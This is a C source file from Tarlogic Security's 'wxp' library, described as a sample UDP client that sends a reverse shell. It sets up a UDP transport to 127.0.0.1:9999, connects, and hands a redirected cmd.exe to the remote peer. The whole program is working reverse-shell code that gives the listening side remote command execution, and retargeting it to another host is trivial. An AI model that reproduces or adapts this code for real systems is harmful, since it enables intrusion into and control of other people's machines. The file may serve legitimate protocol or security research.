/* 
 * wxp-sample-udpclient.c: sample UDP client, sends a reverse shell.
 */
/*
	Copyright (c) 2014, Tarlogic Security
	All rights reserved.

	Redistribution and use in source and binary forms, with or without
	modification, are permitted provided that the following conditions are met:
	1. Redistributions of source code must retain the above copyright
	   notice, this list of conditions and the following disclaimer.
	2. Redistributions in binary form must reproduce the above copyright
	   notice, this list of conditions and the following disclaimer in the
	   documentation and/or other materials provided with the distribution.
	3. All advertising materials mentioning features or use of this software
	   must display the following acknowledgement:
	   This product includes software developed by Tarlogic Security.
	4. Neither the name of the Tarlogic Security nor the
	   names of its contributors may be used to endorse or promote products
	   derived from this software without specific prior written permission.

	THIS SOFTWARE IS PROVIDED BY TARLOGIC SECURITY ''AS IS'' AND ANY
	EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
	WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
	DISCLAIMED. IN NO EVENT SHALL TARLOGIC SECURITY BE LIABLE FOR ANY
	DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
	(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
	LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
	ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
	SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <Windows.h>
#include <wxp.h>
#include <sys/types.h>

#define UDP_MTU 1024

/* Defined in redirect.c */
int ExecuteRedirected (p_wxp_state_t, const char *);

HANDLE hReady;
HANDLE hRead;
HANDLE hConnEvt;
HANDLE hGlobalLock;

char buffer[UDP_MTU];
int  got_bytes;
struct sockaddr_in recv_addr;
struct sockaddr_in send_addr;

SOCKET sck;

int
udp_open (uint16_t port)
{
    int sfd;
    struct sockaddr_in saddr;

    if ((sfd = socket (AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET)
        return -1;

    memset ((void *) &saddr, 0, sizeof (struct sockaddr_in));

    saddr.sin_family = AF_INET;
    saddr.sin_port   = htons (port);

    if (bind (sfd, (struct sockaddr *) &saddr, sizeof (struct sockaddr_in)) == -1)
    {
        closesocket (sfd);
        return -1;
    }

    return sfd;
}

int
udp_open_random ()
{
    int sfd;
    
    if ((sfd = socket (AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET)
        return -1;

    return sfd;
}

DWORD WINAPI
reader_thread (LPVOID data)
{
	char localbuffer[UDP_MTU];
	int  local_got;
	int addrlen = sizeof (struct sockaddr_in);

	WaitForSingleObject (hConnEvt, INFINITE);

	while ((local_got = recvfrom (sck, localbuffer, UDP_MTU, 0, (struct sockaddr *) &recv_addr, &addrlen)) >= 1)
	{
		WaitForSingleObject (hGlobalLock, INFINITE);

		memcpy (buffer, localbuffer, local_got);
		got_bytes = local_got;

		ReleaseMutex (hGlobalLock);

		SetEvent (hRead);
		SetEvent (hReady);
	}

	return 0;
}

uint32_t
udp_get_mtu (void *backend_data)
{
	return 768;
}

int
udp_sendto (void *backend_data, wxp_addr_t src, wxp_addr_t dst, const void *data, size_t size)
{
	if (sendto (sck, (const char *) data, size, 0, (const struct sockaddr *) &send_addr, sizeof (struct sockaddr_in)) != size)
		return -1;

	// printf ("Client: sendto (%d bytes) --> %s:%d (%d, sock: %d)\n", size, inet_ntoa (send_addr.sin_addr), ntohs (send_addr.sin_port), send_addr.sin_family, sck);

	SetEvent (hConnEvt);

	recv_addr = send_addr;

	return 0;
}

int
udp_recvfrom (void *backend_data, p_wxp_addr_t src, p_wxp_addr_t dst, void **data, size_t *size)
{

	WaitForSingleObject (hRead, INFINITE);

	WaitForSingleObject (hGlobalLock, INFINITE);

	if ((*data = malloc (got_bytes)) == NULL)
	{
		ReleaseMutex (hGlobalLock);
		return -1;
	}

	memcpy (*data, buffer, got_bytes);

	*size = got_bytes;

	src->addrlen = dst->addrlen = 0;

	ReleaseMutex (hGlobalLock);

	return 0;
}

HANDLE
udp_get_evt (void *backend_data)
{
	if (hReady == NULL)
		return hReady = CreateEvent (NULL, FALSE, FALSE, NULL);

	return hReady;
}

p_wxp_backend_t
get_udp_backend (const char *appname)
{
	static wxp_backend_t backend;
	static WSADATA wsaData;

	WSAStartup (MAKEWORD (2, 2), &wsaData);

	/* Prepare client socket */
	if ((sck = udp_open_random ()) == -1)
	{
		fprintf (stderr, "%s: cannot open socket: %d\n", appname, GetLastError ());

		getchar ();

		exit (EXIT_FAILURE);
	}

	send_addr.sin_port        = htons (9999);
	send_addr.sin_family      = AF_INET;
	send_addr.sin_addr.s_addr = inet_addr ("127.0.0.1");

	backend.get_mtu  = udp_get_mtu;
	backend.get_evt  = udp_get_evt;
	backend.sendto   = udp_sendto;
	backend.recvfrom = udp_recvfrom;

	return &backend;
}

int
main (int argc, char* argv[])
{	
	wxp_addr_t ignore = {0};
	p_wxp_state_t state;
	DWORD dwId;

	hRead       = CreateEvent (NULL, FALSE, FALSE, NULL);
	hConnEvt    = CreateEvent (NULL, FALSE, FALSE, NULL);
	hGlobalLock = CreateMutex (NULL, FALSE, NULL);

	printf ("Waiting a little bit for the server to start, sck = %d... ", sck);
	fflush (stdout);

	Sleep (1000);

	printf ("done!\n");

	if (wxp_init (ignore, get_udp_backend (argv[0]), NULL) == -1)
	{
		fprintf (stderr, "%s: cannot init: %d\n", argv[0], GetLastError ());

		getchar ();

		exit (EXIT_FAILURE);
	}

	CreateThread (NULL, 0, reader_thread, NULL, 0, &dwId);

	if ((state = wxp_connect (ignore)) == NULL)
	{
		fprintf (stderr, "%s: cannot connect: %d\n", argv[0], GetLastError ());

		getchar ();

		exit (EXIT_FAILURE);
	}

	printf ("Connected! Sessid: %p, offering shell to remote host . . . \n", state->sessid);

	ExecuteRedirected (state, "C:\\Windows\\System32\\cmd.exe");

	printf ("Connection lost\n");

	wxp_state_destroy (state);

	getchar (); /* system ("PAUSE") is for noobs. */

	/* No, really, system ("PAUSE"), wtf?? */

	return 0;
}

